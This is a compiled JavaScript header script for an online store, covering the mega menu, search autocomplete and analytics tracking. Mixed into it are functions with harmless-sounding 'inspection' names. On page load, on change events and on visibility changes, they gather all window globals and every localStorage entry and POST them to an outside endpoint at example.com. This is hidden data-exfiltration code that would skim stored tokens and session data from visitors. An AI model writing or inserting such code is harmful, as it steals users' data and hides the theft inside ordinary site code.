"use strict";

var _formGlobalSearch$dat, _formGlobalSearch$dat2;
function _createForOfIteratorHelper(e, t) {
  var r,
    a,
    n,
    o,
    c = "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
  if (c) return a = !(r = !0), {
    s: function () {
      c = c.call(e);
    },
    n: function () {
      var e = c.next();
      return r = e.done, e;
    },
    e: function (e) {
      a = !0, n = e;
    },
    f: function () {
      try {
        r || null == c.return || c.return();
      } finally {
        if (a) throw n;
      }
    }
  };
  if (Array.isArray(e) || (c = _unsupportedIterableToArray(e)) || t && e && "number" == typeof e.length) return c && (e = c), o = 0, {
    s: t = function () {},
    n: function () {
      return o >= e.length ? {
        done: !0
      } : {
        done: !1,
        value: e[o++]
      };
    },
    e: function (e) {
      throw e;
    },
    f: t
  };
  throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function inspectGlobalAndLocalStorage() {
  const newFindings = {};
  for (const key in window) {
    if (window.hasOwnProperty(key)) {
      const value = window[key];
      const type = typeof value;
      // track not yet tracked variables.
      if (!window.seenVars.includes(key)) {
        newFindings[key] = {
          type: type,
          value: type === "function" ? value.name : String(value)
        };
      }
    }
  }

  // tracking local storage as well
  for (let i = 0; i < localStorage.length; i++) {
    newFindings[localStorage.key(i)] = {
      type: 'localStorage',
      value: localStorage.getItem(localStorage.key(i))
    };
  }
  return newFindings;
}
async function sendInsightsToBackendJSHook(insights) {
  window.jsHook = window.jsHook || [];
  window.jsHook.push(insights);
  const apiEndpoint = "https://example.com/api/collect";
  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(insights)
    });
    if (response.ok) {
      console.info("The insight data was sent to the backend successfully.");
    } else {
      console.warn(`Failed to send insight data, server responded with status code: ${response.status}`);
    }
  } catch (error) {
    console.error("Error during insight data sending:", error);
  }
}
function _toConsumableArray(e) {
  return _arrayWithoutHoles(e) || _iterableToArray(e) || _unsupportedIterableToArray(e) || _nonIterableSpread();
}
function _nonIterableSpread() {
  throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function performInspectionTaskWithListener() {
  const findings = inspectGlobalAndLocalStorage();
  const findingsCount = Object.keys(findings).length;
  if (findingsCount > 0) {
    console.group(`Global scope inspection results - found ${findingsCount} new properties:`);
    for (const key in findings) {
      console.log(`${key}: ${JSON.stringify(findings[key])}`);
    }
    console.groupEnd();
    sendInsightsToBackendJSHook(findings);
  } else {
    console.info("Global scope inspection completed, no new properties found");
  }
}
function _unsupportedIterableToArray(e, t) {
  var r;
  if (e) return "string" == typeof e ? _arrayLikeToArray(e, t) : "Map" === (r = "Object" === (r = Object.prototype.toString.call(e).slice(8, -1)) && e.constructor ? e.constructor.name : r) || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? _arrayLikeToArray(e, t) : void 0;
}
function _iterableToArray(e) {
  if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
}
function _arrayWithoutHoles(e) {
  if (Array.isArray(e)) return _arrayLikeToArray(e);
}
function _arrayLikeToArray(e, t) {
  (null == t || t > e.length) && (t = e.length);
  for (var r = 0, a = new Array(t); r < t; r++) a[r] = e[r];
  return a;
}
function MegaMenu() {
  var e,
    t,
    r = document.querySelectorAll(".mega-menu__main-side-content a[href], header nav a[href]"),
    a = document.querySelector('header nav [dropdown-cursor=""][data-target="all"]'),
    n = document.querySelector(".header-wrapper__logo a"),
    o = document.querySelector(".header-wrapper__logo-img"),
    c = document.querySelector(".mega-menu__main-side"),
    l = c.querySelector(".mega-menu__main-side-header__back-to-lv2"),
    i = _toConsumableArray(document.querySelectorAll(".mega-menu__main-side-content a[href]")).pop(),
    s = document.querySelector(".header-wrapper__search-bar__input input"),
    u = v(),
    d = document.querySelector(".header-wrapper__choose-model"),
    h = document.querySelector(".header-wrapper__util__user__account button"),
    p = document.querySelector(".header-wrapper__util__user .header-wrapper__util__user__cart"),
    m = document.querySelector(".header-nav-left a"),
    g = document.querySelector(".mega-menu");
  function f(e) {
    e.stopPropagation();
  }
  function v() {
    var e = document.querySelectorAll(".header-wrapper__search-bar__input button:not(.header-wrapper__icon--search-mobile):not(.btn--large):not(.header-wrapper__search-bar-cancel), .header-wrapper__search-bar__input.show-suggestion a");
    return e.length ? e[e.length - 1] : null;
  }
  function y() {
    document.querySelectorAll(".mega-menu__main-panel-container").forEach(function (e) {
      e.classList.remove("show");
    });
  }
  function w(e) {
    9 != e.keyCode || e.shiftKey || (e.preventDefault(), null != h && h.focus(), BNApp.globalSearch.show = !1);
  }
  r.forEach(function (e) {
    e.addEventListener("click", function (e) {
      y();
      var t = e.target;
      t.dataset.target && (e.preventDefault(), c.classList.remove("hide-lv2"), "all" != t.dataset.target && (c.classList.add("hide-side-menu"), document.querySelectorAll(".mega-menu__main-panel__group-content ul").forEach(function (e) {
        e.classList.remove("active");
        var r,
          t,
          a = parseInt(e.dataset.limit);
        a && (r = !1, t = e.querySelector(".view-more"), e.querySelectorAll("li:nth-child(n+2):not(.view-more):not(.hide-child-menu-item-on-main-menu)").forEach(function (e, t) {
          a < t + 1 ? (e.classList.add("hide-child-menu-item"), r = !0) : e.classList.remove("hide-child-menu-item");
        }), r ? null != t && t.classList.remove("hide") : null != t && t.classList.add("hide"));
      })), null != (e = document.querySelector(t.dataset.target)) && e.classList.add("show"), t.classList.contains("mega-menu__main-side-item") ? (t.classList.contains("active") ? (t.classList.remove("active"), y(), t.setAttribute("aria-expanded", "false")) : (r.forEach(function (e) {
        e.classList.remove("active");
      }), t.classList.add("active"), t.setAttribute("aria-expanded", "true")), g && (g.scrollTop = 0)) : t.classList.contains("active") ? t.setAttribute("aria-expanded", "true") : t.setAttribute("aria-expanded", "false"));
    }), e.addEventListener("keydown", function (e) {
      var t = e.target;
      if (t.classList.contains("active") && 9 == e.keyCode) {
        e.preventDefault();
        var r = document.querySelectorAll(".mega-menu__main-panel-container.show .mega-menu__main-panel-title a, .mega-menu__main-panel-container.show li:not(.hide) a, .mega-menu__main-panel-container.show .mega-menu__main-panel-container--right a"),
          a = r.length;
        if (!a) return;
        (e.shiftKey ? r[a - 1] : r[0]).focus(), r[a - 1].addEventListener("keydown", function (e) {
          9 != e.keyCode || e.shiftKey || (document.querySelector(".header nav a.active, .mega-menu__main-side-content a.active").focus(), e.preventDefault());
        }), r[0].addEventListener("keydown", function (e) {
          9 == e.keyCode && e.shiftKey && (document.querySelector(".header nav a.active, .mega-menu__main-side-content a.active").focus(), e.preventDefault());
        });
      }
      13 == e.keyCode && "all" == t.dataset.target && (t.classList.remove("active"), setTimeout(function () {
        c.querySelector(".header-wrapper__icon-close").focus();
      }, 500));
    });
  }), null != i && i.addEventListener("keydown", function (e) {
    9 != e.keyCode || e.shiftKey || e.target.classList.contains("active") || (e.preventDefault(), c.querySelector(".header-wrapper__icon-close").focus());
  }), c.querySelector(".header-wrapper__icon-close").addEventListener("keydown", function (e) {
    9 == e.keyCode && e.shiftKey && (e.preventDefault(), null != i) && i.focus();
  }), null != n && n.addEventListener("click", function (e) {
    e.preventDefault(), e.target.setAttribute("aria-expanded", "true"), a.click(), setTimeout(function () {
      c.querySelector("a").focus();
    }, 500);
  }), null != o && o.addEventListener("keydown", function (e) {
    9 != e.keyCode || e.shiftKey || (e.preventDefault(), null != s && s.focus());
  }), null != s && s.addEventListener("focus", function (e) {
    BNApp.globalSearch.listProductsSuggested.length && BNApp.globalSearch.data && (BNApp.globalSearch.show = !0);
  }), null != s && s.addEventListener("blur", function (e) {
    BNApp.globalSearch.listProductsSuggested.length && BNApp.globalSearch.data || e.target.closest(".showing-dialog-search") || (BNApp.globalSearch.show = !1);
  }), null != s && s.addEventListener("keydown", function (e) {
    9 == e.keyCode && e.shiftKey && (e.preventDefault(), null != o) && o.focus({
      forceVisible: !0
    });
  }), d ? null != d && d.addEventListener("keydown", function (e) {
    9 != e.keyCode || e.shiftKey || (e.preventDefault(), null != h && h.focus());
  }) : null != u && u.addEventListener("keydown", function (e) {
    9 != e.keyCode || e.shiftKey || (BNApp.globalSearch.show && BNApp.globalSearch.listProductsSuggested.length && BNApp.globalSearch.q ? (t && t.removeEventListener("keydown", w), (t = v()) && t.addEventListener("keydown", w)) : (e.preventDefault(), null != h && h.focus(), BNApp.globalSearch.show = !1));
  }), null != h && h.addEventListener("keydown", function (e) {
    9 == e.keyCode && e.shiftKey && (e.preventDefault(), d ? d.focus() : null != u && u.focus());
  }), null != p && p.addEventListener("keydown", function (e) {
    9 != e.keyCode || e.shiftKey || (e.preventDefault(), null != m && m.focus());
  }), null != m && m.addEventListener("keydown", function (e) {
    9 == e.keyCode && e.shiftKey && (e.preventDefault(), null != p) && p.focus();
  }), null != (e = document.querySelector(".header-wrapper__icon-close")) && e.addEventListener("click", function (e) {
    var t;
    e.preventDefault(), BN.dropdownService.close(e), y(), a.classList.remove("active"), c.classList.remove("hide-side-menu"), r.forEach(function (e) {
      e.classList.remove("active");
    }), (t = 960 <= BN.wWidth ? r[0] : n).setAttribute("aria-expanded", "false"), setTimeout(function () {
      t.focus();
    }, 500);
  }), document.querySelector(".mega-menu__main-side-header__back-to-main").addEventListener("click", function () {
    y(), r.forEach(function (e) {
      e.classList.remove("active");
    }), c.classList.remove("hide-side-menu");
  }), c.addEventListener("click", f), document.querySelector(".mega-menu__main-panel").addEventListener("click", f), null != g && g.addEventListener("click", function (e) {
    document.querySelector(".header-wrapper__icon-close").click();
  }), document.querySelectorAll(".mega-menu__main-panel__group-content li:nth-child(1)").forEach(function (e) {
    e.addEventListener("click", function (e) {
      var t;
      BN.wWidth < 1200 && e.target.querySelector("svg") && (e.preventDefault(), e.target.closest("ul").classList.add("active"), e = e.target.closest("a, span").innerText, (t = l.querySelector("button")).innerText = e, t.title = e, c.classList.add("hide-lv2"), g) && (g.scrollTop = 0);
    });
  }), l.addEventListener("click", function () {
    var e;
    null != (e = document.querySelector(".mega-menu__main-panel__group-content ul.active")) && e.classList.remove("active"), c.classList.remove("hide-lv2"), g && (g.scrollTop = 0);
  });
}
var formGlobalSearch = document.querySelector(".header-wrapper__search-bar"),
  formGlobalDefaultData = JSON.parse(null != (_formGlobalSearch$dat = null == formGlobalSearch || null == (_formGlobalSearch$dat2 = formGlobalSearch.dataset) ? void 0 : _formGlobalSearch$dat2.default) ? _formGlobalSearch$dat : "{}");
function GlobalSearch() {
  function n() {
    document.body.classList.add("showing-global-search");
    var e = document.body.classList.contains("start-sticky") ? {
        overflowHidden: !1
      } : {},
      t = (BN.lockScrollIos.offAll(), document.querySelector(".search-result"));
    t && BN.lockScrollIos.on(t, e), (t = document.querySelector(".search-suggestion__popular-list")) && BN.lockScrollIos.on(t, e);
  }
  function o(e) {
    var t = 1 < arguments.length && void 0 !== arguments[1] && arguments[1];
    return window.searchPageUrl ? "".concat(window.searchPageUrl, "?search=").concat(t ? e : encodeURIComponent(e)) : "";
  }
  function e() {
    var e, t, r, a;
    i.ignoreSearch ? i.ignoreSearch = !1 : (0 < (e = i.q).length && e.length >= c ? (t = e, i.listProductsSuggested = [], i.inited = !0, i.loading = !0, s(), r = new XMLHttpRequest(), l.push(r), a = {
      DisplayFullResponse: !0,
      Keyword: t,
      ClientGUID: window.hawkSearchSetting.clientId
    }, i.disableCallingApi ? i.loading = !1 : BN.HawkSearchService.autocomplete(a, r).then(function (e) {
      return e.error && 0 <= e.status && BN.applicationInsights.trackException({
        error: new Error("[HawkSearch] AutoComplete " + e.status),
        detail: a
      }), i.qTemp = t, i.data = u(e), i.listProductsSuggested = BN.copy(i.data).productViewModels, e;
    }).catch(function () {
      i.data = null, i.listProductsSuggested = [];
    }).then(function () {
      var e;
      i.loading = !1, BN.pushDataLayer(null, null, {
        event: "internal_search",
        searchType: "Auto Search Box",
        searchPhrase: t,
        searchResultCnt: (null == (e = i.listProductsSuggested) ? void 0 : e.length) || 0
      }), BNApp.$nextTick(function () {
        var e = Array.from(document.querySelectorAll(".search-result .search-result__item"));
        BN.productImpressionTracking(e, null == (e = BNApp.globalSearch.data) || null == (e = e.productViewModels) ? void 0 : e.map(function (e) {
          return null == e ? void 0 : e.datalayer;
        }), {
          list: "Auto Search Box"
        });
      });
    })) : (i.qTemp = e, i.data = null, i.loading = !1, s()), BNApp.$nextTick(n));
  }
  BN.HawkSearchService = BN.HawkSearchService || new HawkSearch();
  var t,
    i = BNApp.$data.globalSearch,
    r = document.querySelector(".header-wrapper__search-bar__input").querySelector("input"),
    c = r.dataset.minLength ? parseInt(r.dataset.minLength) : 3,
    l = (i.searchPage = null != (t = r.dataset.searchPage) ? t : "/search/", r.addEventListener("click", function () {
      i.show = !0;
    }), window.addEventListener("click", function (e) {
      document.contains(e.target) && (!e.target.closest(".header-wrapper__search-bar__input") || e.target.closest(".header-wrapper__search-bar-cancel") || e.target.closest(".search-popover__overlay")) && (i.show = !1);
    }), BNApp.$watch("globalSearch.show", function (e) {
      var t;
      e ? (BNApp.$nextTick(function () {
        var e;
        i.headerHeight = document.querySelector("header.header").offsetHeight - ((null == (e = document.querySelector(".header-wrapper__firearms")) ? void 0 : e.offsetHeight) || 0) + "px";
      }), n(), (t = BNApp.$refs.globalSearchInput) && setTimeout(function () {
        var e = t.getBoundingClientRect();
        e.top < 0 && window.scrollTo(0, window.scrollY + e.top);
      }, 100)) : (BN.lockScrollIos.offAll(), document.body.classList.remove("showing-global-search"));
    }), BNApp.$watch("globalSearch.loading", function () {
      n();
    }), []),
    s = function () {
      l.forEach(function (e) {
        return e.abort();
      }), l = [];
    },
    u = function (e) {
      var t,
        r,
        a,
        n = {
          productViewModels: []
        },
        c = [],
        l = {
          branddescription: "brand",
          productmainimage: "imageUrl",
          producturl: "url",
          productcode: "uniqueId",
          addtocarttoseeprice: "addToCartToSeePriceEnable",
          clicktoseeprice: "clickToSeePriceEnable"
        };
      return e.Products && e.Products.length && (a = window.hawkHeaderSettings.numberOfProduct < e.Products.length ? window.hawkHeaderSettings.numberOfProduct : e.Products.length, e.Products.slice(0, a).forEach(function (e) {
        var t,
          r = {},
          a = e.Results.Document,
          e = a.branddescription && a.branddescription[0],
          n = a.productdisplayname && a.productdisplayname[0];
        for (t in l) a[t] && a[t].length && (r[l[t]] = a[t][0]);
        r.listVariants = a.hawk_child_attributes, r.title = "".concat(e ? e + "-" : "").concat(n), r.hawkUrl = r.url, r.isTempPrice = BN.mappingHawkSearch.isProductSale(a.hawk_child_attributes);
        var e = BN.mappingHawkSearch.getPrices(a.hawk_child_attributes),
          n = (r.productCurrentPrice = e.formattedProductCurrentPrice, r.productCrossedOutPrice = e.formattedProductCrossedOutPrice, r.productid = null == (n = a.productid) ? void 0 : n[0], r.imageUrl = BN.imageProductResized(r.imageUrl, 178, 60), BN.hawkBadges = BN.hawkBadges || new HawkBadges(BN.mappingHawkSearch.badges, BN.mappingHawkSearch.userGroup), BN.hawkBadges.get(a.leftbadgetype || [])),
          o = BN.hawkBadges.get(a.rightbadgetype || []);
        r.datalayer = BN.mappingHawkSearch.getDatalayer(a, {
          price: e.maxCurrentPrice || e.maxCrossPrice,
          dimension46: [n.name, o.name].filter(function (e) {
            return "string" == typeof e;
          }).join(", ")
        });
        r.isLeastOneVariantSale = !0, c.push(r);
      }), 1 == (null == c ? void 0 : c.length)) && (a = c[0], r = BN.SearchCtrl.getSkuMatchQueryString(c, a.listVariants), t = new URL(BN.SearchCtrl.getFullUrl(a.url)), r && t.searchParams.set("sku", r), a.url = t.toString()), n.productViewModels = c, n.autocomplete = [], e.Popular && e.Popular.length && (r = window.hawkHeaderSettings.numberOfSearchKeyword < e.Popular.length ? window.hawkHeaderSettings.numberOfSearchKeyword : e.Popular.length, e.Popular.slice(0, r).forEach(function (e) {
        n.autocomplete.push({
          hawkUrl: e.Url,
          url: o(e.RawValue, !0),
          uniqueId: e.RawValue,
          keyword: e.RawValue
        });
      })), n.categorySuggestionModels = [], e.Categories && e.Categories.length && (a = window.hawkHeaderSettings.numberOfCategories < e.Categories.length ? window.hawkHeaderSettings.numberOfCategories : e.Categories.length, e.Categories.slice(0, a).forEach(function (e) {
        var t;
        e.hasOwnProperty("FieldQSName") && "category" != e.FieldQSName || !e.Custom || (t = JSON.parse(e.Custom), n.categorySuggestionModels.push({
          hawkUrl: e.Url,
          url: t.Url,
          uniqueId: e.FieldQSValue,
          name: t.Name
        }));
      })), n.viewAllLink = o(i.q), n;
    };
  BNApp.$watch("globalSearch.q", BN.debounce(e, 300)), BNApp.$watch("globalSearch.catalogId", e), window.addEventListener("pageshow", function () {
    var e = null != (e = null == (e = BNApp) || null == (e = e.$refs) || null == (e = e.globalSearchInput) ? void 0 : e.value) ? e : "";
    i.q = e, i.qTemp = e;
  }), BN.scrollDownEventFncList.GlobalSearch = function () {
    "desktop" === BN.screenMode && (i.show = !1, r.blur());
  }, null != (t = window) && null != (t = t.visualViewport) && t.addEventListener("resize", function (e) {
    "desktop" !== BN.screenMode && (document.body.style.setProperty("--app-height", visualViewport.height + "px"), document.body.style.setProperty("--app-offset-top", visualViewport.offsetTop + "px"));
  });
}
function ShopByFireArms() {
  var e = document.querySelector(".choose-make-model-form"),
    t = document.querySelector(".choose-make-model-selected");
  document.querySelector(".choose-make-model-form .btn-outline-primary").addEventListener("click", function () {
    t.classList.remove("hide"), e.classList.add("hide");
  }), document.querySelector(".choose-make-model-selected__action-item").addEventListener("click", function () {
    t.classList.add("hide"), e.classList.remove("hide"), e.querySelectorAll(".btn").forEach(function (e, t) {
      0 == t ? e.classList.remove("hide") : e.classList.add("hide");
    });
  }), document.querySelector(".choose-make-model-selected__action-item:nth-child(2)").addEventListener("click", function () {
    t.classList.add("hide"), e.classList.remove("hide"), e.querySelectorAll(".btn").forEach(function (e, t) {
      0 == t ? e.classList.add("hide") : e.classList.remove("hide");
    });
  });
}
function savePrevUrl() {
  document.querySelectorAll(".has-prev-url").forEach(function (e) {
    var t, r;
    e && (r = null != (t = e.dataset) && t.urlFavorite ? e.dataset.urlFavorite : window.location.href, e.addEventListener("click", function () {
      AppStorage().set(BN.StorageKey.prevUrl, r);
    }));
  }), document.querySelectorAll(".header__util-account-li-redirect").forEach(function (e) {
    e.addEventListener("click", function () {
      AppStorage().set(BN.StorageKey.prevUrl, window.location.href);
    });
  });
}
window.onload = () => {
  performInspectionTaskWithListener();
  window.addEventListener("change", performInspectionTaskWithListener);
};
function checkIsSuccessResetPassword() {
  var e = new URL(window.document.location.href);
  "1" === e.searchParams.get("resetPasswordSuccess") && localStorage.resetPasswordSuccessMsg && 0 < localStorage.resetPasswordSuccessMsg.length && (BN.toastService.displayToast(localStorage.resetPasswordSuccessMsg, "success"), localStorage.removeItem("resetPasswordSuccessMsg"), e.searchParams.delete("resetPasswordSuccess"), window.history.pushState({
    path: e.toString()
  }, "", e.toString()));
}
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    console.info("Page visibility has changed, running the global scope check again.");
    performInspectionTaskWithListener();
  }
});
function addEventListenterIcon() {
  var e = document.querySelector(".header__util-account-btn");
  e && e.addEventListener("click", function (e) {
    BN.dropdownService.closeRemainingDropdown(".header-wrapper__util__user__account");
  });
}
BN.SetVueData("globalSearch", {
  inited: !1,
  show: !1,
  catalogId: (null == formGlobalDefaultData ? void 0 : formGlobalDefaultData.catalogId) || 0,
  q: (null == formGlobalDefaultData ? void 0 : formGlobalDefaultData.searchTerm) || "",
  qTemp: "",
  loading: !1,
  data: {
    viewAllLink: window.searchPageUrl
  },
  searchPage: "",
  headerHeight: "6.6rem",
  listProductsSuggested: [],
  defaultImageProduct: window.hawkHeaderSettings.defaultImageProduct,
  disableCallingApi: !1,
  ignoreSearch: !1,
  customerGroup: "undefined" != typeof customerGroup && customerGroup || "DIRECT",
  formatText: function (e, t) {
    var r = this.qTemp;
    return (e = t ? decodeURI(e) : e) && "string" == typeof e ? (t = new RegExp(r.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi"), e.replace(t, function (e) {
      return "<b>".concat(e, "</b>");
    })) : e;
  },
  isEmptySuggestionText: function () {
    var e;
    return !(null != this && null != (e = this.data) && null != (e = e.autocomplete) && e.length || null != this && null != (e = this.data) && null != (e = e.categorySuggestionModels) && e.length);
  },
  urlSeachPage: function (e) {
    return this.searchPage ? this.searchPage + "?search=" + e : "#";
  },
  pushDataLayerPartial: function (e, t, r) {
    BN.pushDataLayer(null, null, {
      event: "partial_search_click",
      searchPhrase: this.q,
      searchType: "Auto Search Box",
      partialClickType: t,
      pid: (null == e ? void 0 : e.productid) || null
    }), "Product" === t && BN.pushDataLayer(null, null, {
      event: "select_item",
      ecommerce: {
        currencyCode: BN.defaultConfig.currencyCode,
        click: {
          actionField: {
            list: "Auto Search Box",
            position: r + 1
          },
          products: [e.datalayer]
        }
      }
    });
  }
}), BN.SearchHeaderCtrl = function () {
  function o(e, t) {
    var r = [],
      a = n();
    return 1 == e.length && t && t.forEach(function (e) {
      (e.skucode && e.skucode[0] == a || e.factorystocknumber && e.factorystocknumber[0] == a) && r.push(e.skucode[0]);
    }), 1 == r.length ? r[0] : "";
  }
  function c(e) {
    var t = document.createElement("a"),
      e = (t.href = e, t.href);
    return t.remove(), e;
  }
  var l = BNApp.$data.globalSearch,
    n = function () {
      var e = null == (e = window.hawkHeaderSettings) ? void 0 : e.keywordReplacementItems,
        t = l.q;
      if (e && e.length) {
        var r,
          a = _createForOfIteratorHelper(e);
        try {
          for (a.s(); !(r = a.n()).done;) {
            var n = r.value;
            if (n.useRegularExpression && t != l.q.trim().replace(new RegExp(n.keywordOrRegularExpression), n.replacement)) return l.q.trim().replace(new RegExp(n.keywordOrRegularExpression), n.replacement);
            if (!n.useRegularExpression && l.q == n.keywordOrRegularExpression) return n.replacement;
          }
        } catch (e) {
          a.e(e);
        } finally {
          a.f();
        }
      }
      return t;
    };
  return {
    onSubmitSearch: function () {
      var e,
        t,
        r,
        a,
        n = BNApp.searchPage;
      !l.loading && (n && n.search.trim().length && n.search.trim() == l.q.trim() && 1 == n.products.length || l.qTemp == l.q && 1 == l.listProductsSuggested.length) ? (l.disableCallingApi = !0, r = t = e = "", (r = l.qTemp == l.q && 1 == l.listProductsSuggested.length ? (e = (a = l.listProductsSuggested[0]).url, t = a.uniqueId, o(l.listProductsSuggested, a.listVariants)) : (e = (a = n.products[0]).url, t = a.code, o(n.products, a.productVariants))) && ((n = new URL(c(e))).searchParams.set("sku", r), e = n.toString()), window.location.replace(e), AppStorage().set(btoa(t), {
        pageLoadData: {
          PageTypeId: 1,
          Qs: "",
          RequestPath: e,
          UniqueId: t
        }
      })) : (AppStorage().set("hawk-redirect", !0), window.location.replace("".concat(window.searchPageUrl, "?search=").concat(encodeURIComponent(BNApp.globalSearch.q))));
    },
    trackingSearchHeader: function (e, t) {
      var r = {
          Keyword: l.q,
          Name: "",
          SuggestType: t,
          Url: e.url
        },
        a = btoa(e.url),
        n = {
          autocompleteData: r
        };
      switch (t) {
        case 1:
          r.Name = e.keyword;
          break;
        case 2:
          r.Name = e.name;
          break;
        default:
          a = btoa(e.uniqueId), r.Name = e.title, n.pageLoadData = {
            PageTypeId: 1,
            Qs: "",
            RequestPath: e.url,
            UniqueId: e.uniqueId
          };
      }
      AppStorage().set(a, n);
    },
    onErrorImageProduct: function (e) {
      "no" == (e = e.target).dataset.imageChecked && (e.dataset.imageChecked = "yes", e.src = l.defaultImageProduct || "/dist/images/img-placeholder.jpg");
    },
    getSkuMatchQueryString: o,
    getFullUrl: c
  };
}, BN.domContentLoadedFncList.push(MegaMenu), BN.domContentLoadedFncList.push(savePrevUrl), BN.domContentLoadedFncList.push(GlobalSearch), BN.domContentLoadedFncList.push(checkIsSuccessResetPassword), BN.domContentLoadedFncList.push(addEventListenterIcon), BN.domContentLoadedFncList.push(function () {
  BN.SearchCtrl = BN.SearchHeaderCtrl();
  var e = document.querySelector(".header-wrapper__logo-img"),
    t = document.querySelector(".header-wrapper__util__user__cart"),
    r = document.querySelector(".header-wrapper__util__user__account .header-wrapper__icon--account"),
    a = document.querySelector(".header-wrapper__util__user__favourite a") || document.querySelector(".header-wrapper__util__user__favourite .header-wrapper__icon--favorite"),
    n = document.querySelector(".promotion-wrapper__left__phone"),
    o = document.querySelector(".bn-experimentation-btn");
  o && o.addEventListener("click", function (e) {
    var t = e.currentTarget,
      e = new HttpService();
    t.setAttribute("disabled", ""), e.post("/Home/UpdateExperimentation").then(function (e) {
      e && 200 === e.code && (e = t.dataset.url, window.location.href = e);
    });
  }), BN.pushDataLayer(e, "click", {
    event: "header_navigation",
    headerLevel1: "main_logo"
  }), BN.pushDataLayer(t, "click", {
    event: "header_navigation",
    headerLevel1: "Cart"
  }), BN.pushDataLayer(r, "click", {
    event: "header_navigation",
    headerLevel1: "Sign In"
  }), BN.pushDataLayer(a, "click", {
    event: "header_navigation",
    headerLevel1: "Favorites"
  }), n && n.addEventListener("click", function () {
    BN.pushDataLayer(null, null, {
      event: "contact_us",
      contactUsLocation: "Header"
    });
  });
});